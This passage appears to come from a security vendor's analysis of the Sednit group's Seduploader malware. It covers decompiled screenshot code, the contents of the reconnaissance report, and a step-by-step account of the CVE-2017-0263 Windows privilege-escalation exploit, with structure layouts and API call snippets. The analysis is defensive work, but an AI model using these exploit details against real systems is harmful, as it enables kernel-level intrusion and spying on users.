">_DWORD *</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-t">signed</span><span class="crayon-h"> </span><span class="crayon-t">int</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-o">*</span><span class="crayon-v">v4</span><span class="crayon-sy">)</span><span class="crayon-sy">(</span><span class="crayon-v">v4</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caed817309743-24"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-e">IStream_Size</span><span class="crayon-sy">(</span><span class="crayon-v">ppstm</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">pui</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581b882caed817309743-25"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">cb</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">pui</span><span class="crayon-sy">.</span><span class="crayon-v">s</span><span class="crayon-sy">.</span><span class="crayon-v">LowPart</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caed817309743-26"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">v7</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">ppstm</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581b882caed817309743-27"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">*</span><span class="crayon-v">a1</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">pui</span><span class="crayon-sy">.</span><span class="crayon-v">s</span><span class="crayon-sy">.</span><span class="crayon-v">LowPart</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caed817309743-28"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-e">IStream_Reset</span><span class="crayon-sy">(</span><span class="crayon-v">v7</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581b882caed817309743-29"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">v1</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">j_HeapAlloc</span><span class="crayon-sy">(</span><span class="crayon-v">cb</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caed817309743-30"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-e">IStream_Read</span><span class="crayon-sy">(</span><span class="crayon-v">ppstm</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">v1</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">cb</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581b882caed817309743-31"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">ppstm</span><span class="crayon-o">-&gt;</span><span class="crayon-v">lpVtbl</span><span class="crayon-o">-&gt;</span><span class="crayon-e">Release</span><span class="crayon-sy">(</span><span class="crayon-v">ppstm</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caed817309743-32"><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-60581b882caed817309743-33"><span class="crayon-e">GdiplusShutdown</span><span class="crayon-sy">(</span><span class="crayon-v">token</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caed817309743-34"><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-v">v1</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581b882caed817309743-35"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0010 seconds] -->
<p>As usual, Sednit operators did not reinvent the wheel. We found some similarities between their implementation of the screenshot function and code available on <a href="http://stackoverflow.com/questions/997175/how-can-i-take-a-screenshot-and-save-it-as-jpeg-on-windows" target="_blank" rel="noopener noreferrer">stackoverflow</a>. Instead of using <span style="font-family: courier new,courier,monospace;">GetForegroundWindow</span> to retrieve a handle on the foreground window in which the user is currently working, Sednit chose to use <span style="font-family: 'courier new', courier, monospace;">keybd_event</span> to send a “Print screen” keystroke and then retrieve the image from the clipboard.</p>
<p>The image is then base64-encoded and added to the report, whose structure now looks like this:</p>
<table style="border-color: #000000;" border="1">
<thead>
<tr style="height: 24px;">
<td style="height: 24px;"><strong>Tag</strong></td>
<td style="height: 24px;"><strong>Value</strong></td>
</tr>
</thead>
<tbody>
<tr style="height: 24px;">
<td style="height: 24px;">id=</td>
<td style="height: 24px;">Hard drive serial number*</td>
</tr>
<tr style="height: 25.8438px;">
<td style="height: 25.8438px;">w=</td>
<td style="height: 25.8438px;">Process list</td>
</tr>
<tr style="height: 24px;">
<td style="height: 24px;"><em>None</em></td>
<td style="height: 24px;">NICs information</td>
</tr>
<tr style="height: 24px;">
<td style="height: 24px;">disk=</td>
<td style="height: 24px;">register key**</td>
</tr>
<tr style="height: 24px;">
<td style="height: 24px;">build=</td>
<td style="height: 24px;">4 bytes</td>
</tr>
<tr style="height: 24px;">
<td style="height: 24px;">inject</td>
<td style="height: 24px;">optional field***</td>
</tr>
<tr style="height: 24px;">
<td style="height: 24px;">img=</td>
<td style="height: 24px;">screenshot encoded in base64</td>
</tr>
</tbody>
</table>
<p>* result of “<span style="font-family: 'courier new', courier, monospace;">import win32api;print hex(win32api.GetVolumeInformation(&#8220;C:\\&#8221;)[1])</span>”<br />
** content of <span style="font-family: 'courier new', courier, monospace;">HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum</span><br />
*** toggled if SEDUPLOADER uses injection into a browser to connect to Internet</p>
<p>Screenshotting was used before by Sednit. In the past, the feature was built in a separate, standalone tool often invoked by Xtunnel at a later infection stage (see page 77 of our whitepaper), but it is now built in Seduploader for use at the reconnaissance phase.</p>
<p>Finally, on the config side, two new functions were added: <span style="font-family: 'courier new', courier, monospace;">shell</span> and <span style="font-family: 'courier new', courier, monospace;">LoadLib</span>. The shell config allows the attacker to execute arbitrary code directly in-memory. The <span style="font-family: 'courier new', courier, monospace;">LoadLib</span> is a bit field that allows running an arbitrary DLL by calling <span style="font-family: 'courier new', courier, monospace;">rundll32.exe</span></p>
<h2><strong>CVE-2017-0263 &#8211; Local privilege escalation</strong></h2>
<h2><strong>Exploit Workflow</strong></h2>
<p>As mentioned before, in order to deploy Seduploader Payload, Seduploader Dropper gains <span style="font-family: 'courier new', courier, monospace;">System</span> privileges by exploiting CVE-2017-0263, an LPE vulnerability. In this section, we will describe how this vulnerability is exploited by Sednit.</p>
<p>First, even though the vulnerability affects Windows 7 and above (see at the end of this post for the full list of affected platforms), the exploit is designed to avoid running on Windows version 8.1 and above.</p>
<p>Since the exploit can target both 32-bit and 64-bit platforms, it will first determine if the process is running under WOW64. The exploit will allocate multiple pages, until it reaches a high address (0x02010000). It will then build the following structure:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b882caef879637705" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
struct Payload
 {
   LONG PTEAddress;               // Points to the PTE entry containing the physical address of the page containing our structure. Only used for windows 8+
   LONG pid;                      // Injected process pid;
   LONG offset_of_lpszMenuName;   // Offset of the lpszMenuName in the win32k!tagCLS structure
   LONG offset_of_tagTHREADINFO;  // Offset of the pti field in the win32k!tagWND structure.
   LONG offset_of_tagPROCESSINFO; // Offset of the ppi field in the win32k!tagTHREADINFO structure.
   LONG offset_of_TOKEN;          // Offset of the Token field in the nt!_EPROCESS structure.
   LONG tagCLS[0x100];            // Array containing the tagCLS of the created windows.
   LONG WndProcCode;              // Code of the WndProc meant to be run in kernel mode.
 };</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b882caef879637705-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caef879637705-2">2</div><div class="crayon-num" data-line="crayon-60581b882caef879637705-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caef879637705-4">4</div><div class="crayon-num" data-line="crayon-60581b882caef879637705-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caef879637705-6">6</div><div class="crayon-num" data-line="crayon-60581b882caef879637705-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caef879637705-8">8</div><div class="crayon-num" data-line="crayon-60581b882caef879637705-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caef879637705-10">10</div><div class="crayon-num" data-line="crayon-60581b882caef879637705-11">11</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b882caef879637705-1"><span class="crayon-t">struct</span><span class="crayon-h"> </span><span class="crayon-e">Payload</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caef879637705-2"><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-60581b882caef879637705-3"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-t">LONG</span><span class="crayon-h"> </span><span class="crayon-v">PTEAddress</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-c">// Points to the PTE entry containing the physical address of the page containing our structure. Only used for windows 8+</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caef879637705-4"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-t">LONG</span><span class="crayon-h"> </span><span class="crayon-v">pid</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// Injected process pid;</span></div><div class="crayon-line" id="crayon-60581b882caef879637705-5"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-t">LONG</span><span class="crayon-h"> </span><span class="crayon-v">offset_of_lpszMenuName</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-c">// Offset of the lpszMenuName in the win32k!tagCLS structure</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caef879637705-6"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-t">LONG</span><span class="crayon-h"> </span><span class="crayon-v">offset_of_tagTHREADINFO</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-c">// Offset of the pti field in the win32k!tagWND structure.</span></div><div class="crayon-line" id="crayon-60581b882caef879637705-7"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-t">LONG</span><span class="crayon-h"> </span><span class="crayon-v">offset_of_tagPROCESSINFO</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-c">// Offset of the ppi field in the win32k!tagTHREADINFO structure.</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caef879637705-8"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-t">LONG</span><span class="crayon-h"> </span><span class="crayon-v">offset_of_TOKEN</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// Offset of the Token field in the nt!_EPROCESS structure.</span></div><div class="crayon-line" id="crayon-60581b882caef879637705-9"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-t">LONG</span><span class="crayon-h"> </span><span class="crayon-v">tagCLS</span><span class="crayon-sy">[</span><span class="crayon-cn">0x100</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// Array containing the tagCLS of the created windows.</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caef879637705-10"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-t">LONG</span><span class="crayon-h"> </span><span class="crayon-v">WndProcCode</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// Code of the WndProc meant to be run in kernel mode.</span></div><div class="crayon-line" id="crayon-60581b882caef879637705-11"><span class="crayon-h"> </span><span class="crayon-sy">}</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p>Then, it will retrieve the address of <span style="font-family: 'courier new', courier, monospace;">HMValidateHandle</span>. This function allows the attacker to leak the kernel address of a <span style="font-family: 'courier new', courier, monospace;">tagWND</span> object.</p>
<p>Here is an overview of how the rest of the exploit works:</p>
<p><img class="aligncenter wp-image-93307" src="/wp-content/uploads/2017/05/6-LPE-overview-1024x674.png" alt="" width="826" height="544" srcset="https://www.welivesecurity.com/wp-content/uploads/2017/05/6-LPE-overview-1024x674.png 1024w, https://www.welivesecurity.com/wp-content/uploads/2017/05/6-LPE-overview-300x197.png 300w, https://www.welivesecurity.com/wp-content/uploads/2017/05/6-LPE-overview-768x505.png 768w, https://www.welivesecurity.com/wp-content/uploads/2017/05/6-LPE-overview-65x42.png 65w, https://www.welivesecurity.com/wp-content/uploads/2017/05/6-LPE-overview-114x76.png 114w, https://www.welivesecurity.com/wp-content/uploads/2017/05/6-LPE-overview-97x65.png 97w" sizes="(max-width: 826px) 100vw, 826px" /></p>
<p>The exploit will create 256 random window classes and their associated windows. Each window will have 512 bytes of extra memory. This extra memory is contiguous to the <span style="font-family: 'courier new', courier, monospace;">tagWND</span> object in the kernel space. After the first created window, i.e. in the extra memory, the exploit will build a fake object containing mostly only its own address for later use, as shown in the picture:</p>
<p><img class="aligncenter size-full wp-image-93308" src="/wp-content/uploads/2017/05/7-LPE-extramem.png" alt="" width="504" height="397" srcset="https://www.welivesecurity.com/wp-content/uploads/2017/05/7-LPE-extramem.png 504w, https://www.welivesecurity.com/wp-content/uploads/2017/05/7-LPE-extramem-300x236.png 300w" sizes="(max-width: 504px) 100vw, 504px" /></p>
<p>When all the windows are created, the exploit will allocate 2 additional windows. The purpose of first one is to be executed in a kernel thread: let’s call this window <span style="font-family: 'courier new', courier, monospace;">KernelWnd</span>, and the other one will mainly receive all the necessary messages needed for the exploit to complete; let’s call this window <span style="font-family: 'courier new', courier, monospace;">TargetWindow</span>. Then, the exploit associates this procedure with the newly allocated object, <span style="font-family: 'courier new', courier, monospace;">KernelWnd</span>.</p>
<p><span style="font-family: 'courier new', courier, monospace;"><em>// &#8230;<br />
</em></span><span style="font-family: 'courier new', courier, monospace;">TargetWindow = CreateWindowExW(0x80088u, MainWindowClass, 0, WS_VISIBLE, 0, 0, 1, 1, 0, 0, hModuleSelf, 0);<br />
</span><span style="font-family: 'courier new', courier, monospace;">KernelWnd = CreateWindowExW(0, MainWindowClass, 0, 0, 0, 0, 1, 1, 0, 0, hModuleSelf, 0);<br />
</span><span style="font-family: 'courier new', courier, monospace;"><em>// &#8230;<br />
</em></span><span style="font-family: 'courier new', courier, monospace;">SetWindowLongW(KernelWnd, GWL_WNDPROC, (LONG)Payload_0-&gt;WndProc);</span></p>
<p>Let’s add some context around the behavior of the win32k component. Every time you create a new window through <span style="font-family: 'courier new', courier, monospace;">CreateWindowExW</span>, the driver will allocate a new <span style="font-family: 'courier new', courier, monospace;">tagWND</span> object in the kernel. The object can be described like this (some fields are removed for clarity’s sake):</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b882caf1567167741" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
kd&gt; dt tagWND
 win32k!tagWND
   +0x000 head             : _THRDESKHEAD
   +0x028 state            : Uint4B
   // ...
   +0x028 bServerSideWindowProc : Pos 18, 1 Bit
   // ...
   +0x042 fnid             : Uint2B
   +0x048 spwndNext        : Ptr64 tagWND
   +0x050 spwndPrev        : Ptr64 tagWND
   +0x058 spwndParent      : Ptr64 tagWND
   +0x060 spwndChild       : Ptr64 tagWND
   +0x068 spwndOwner       : Ptr64 tagWND
   +0x070 rcWindow         : tagRECT
   +0x080 rcClient         : tagRECT
   +0x090 lpfnWndProc      : Ptr64     int64
   +0x098 pcls             : Ptr64 tagCLS
   // ...</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b882caf1567167741-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caf1567167741-2">2</div><div class="crayon-num" data-line="crayon-60581b882caf1567167741-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caf1567167741-4">4</div><div class="crayon-num" data-line="crayon-60581b882caf1567167741-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caf1567167741-6">6</div><div class="crayon-num" data-line="crayon-60581b882caf1567167741-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caf1567167741-8">8</div><div class="crayon-num" data-line="crayon-60581b882caf1567167741-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caf1567167741-10">10</div><div class="crayon-num" data-line="crayon-60581b882caf1567167741-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caf1567167741-12">12</div><div class="crayon-num" data-line="crayon-60581b882caf1567167741-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caf1567167741-14">14</div><div class="crayon-num" data-line="crayon-60581b882caf1567167741-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caf1567167741-16">16</div><div class="crayon-num" data-line="crayon-60581b882caf1567167741-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b882caf1567167741-18">18</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b882caf1567167741-1"><span class="crayon-v">kd</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-e">dt </span><span class="crayon-e">tagWND</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caf1567167741-2"><span class="crayon-e"> </span><span class="crayon-v">win32k</span><span class="crayon-o">!</span><span class="crayon-v">tagWND</span></div><div class="crayon-line" id="crayon-60581b882caf1567167741-3"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">+</span><span class="crayon-cn">0x000</span><span class="crayon-h"> </span><span class="crayon-v">head</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">_THRDESKHEAD</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caf1567167741-4"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">+</span><span class="crayon-cn">0x028</span><span class="crayon-h"> </span><span class="crayon-v">state</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">Uint4B</span></div><div class="crayon-line" id="crayon-60581b882caf1567167741-5"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-c">// ...</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caf1567167741-6"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">+</span><span class="crayon-cn">0x028</span><span class="crayon-h"> </span><span class="crayon-v">bServerSideWindowProc</span><span class="crayon-h"> </span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">Pos</span><span class="crayon-h"> </span><span class="crayon-cn">18</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-v">Bit</span></div><div class="crayon-line" id="crayon-60581b882caf1567167741-7"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-c">// ...</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caf1567167741-8"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">+</span><span class="crayon-cn">0x042</span><span class="crayon-h"> </span><span class="crayon-v">fnid</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">Uint2B</span></div><div class="crayon-line" id="crayon-60581b882caf1567167741-9"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">+</span><span class="crayon-cn">0x048</span><span class="crayon-h"> </span><span class="crayon-v">spwndNext</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-e">Ptr64 </span><span class="crayon-v">tagWND</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caf1567167741-10"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">+</span><span class="crayon-cn">0x050</span><span class="crayon-h"> </span><span class="crayon-v">spwndPrev</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-e">Ptr64 </span><span class="crayon-v">tagWND</span></div><div class="crayon-line" id="crayon-60581b882caf1567167741-11"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">+</span><span class="crayon-cn">0x058</span><span class="crayon-h"> </span><span class="crayon-v">spwndParent</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-e">Ptr64 </span><span class="crayon-v">tagWND</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caf1567167741-12"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">+</span><span class="crayon-cn">0x060</span><span class="crayon-h"> </span><span class="crayon-v">spwndChild</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-e">Ptr64 </span><span class="crayon-v">tagWND</span></div><div class="crayon-line" id="crayon-60581b882caf1567167741-13"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">+</span><span class="crayon-cn">0x068</span><span class="crayon-h"> </span><span class="crayon-v">spwndOwner</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-e">Ptr64 </span><span class="crayon-v">tagWND</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caf1567167741-14"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">+</span><span class="crayon-cn">0x070</span><span class="crayon-h"> </span><span class="crayon-v">rcWindow</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">tagRECT</span></div><div class="crayon-line" id="crayon-60581b882caf1567167741-15"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">+</span><span class="crayon-cn">0x080</span><span class="crayon-h"> </span><span class="crayon-v">rcClient</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">tagRECT</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caf1567167741-16"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">+</span><span class="crayon-cn">0x090</span><span class="crayon-h"> </span><span class="crayon-v">lpfnWndProc</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-e">Ptr64&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">int64</span></div><div class="crayon-line" id="crayon-60581b882caf1567167741-17"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">+</span><span class="crayon-cn">0x098</span><span class="crayon-h"> </span><span class="crayon-v">pcls</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-e">Ptr64 </span><span class="crayon-v">tagCLS</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b882caf1567167741-18"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-c">// ...</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0005 seconds] -->
<p>As you can see, the <span style="font-family: 'courier new', courier, monospace;">tagWND-&gt;lpfnWindowProc</span> contains the address of the procedure associated with this window. The driver usually lowers its privileges in order to execute this procedure in the user’s context. This behavior is controlled by the bit <span style="font-family: 'courier new', courier, monospace;">tagWND-&gt;bServerSideProc</span>. If this bit is set, then the procedure will be run with elevated privileges, i.e in the kernel. The exploit works by flipping the <span style="font-family: 'courier new', courier, monospace;">tagWND-&gt;bServerSideProc</span> bit. All the attacker needs to do is to find a way of flipping that bit.</p>
<p>During the destruction of the menus, the hook set up before will check if the class of the object is <span style="font-family: 'courier new', courier, monospace;">SysShadow</span> as shown on the next code block. If that&#8217;s the case, it will replace the associated procedure with its own.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b882caf2140561772" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
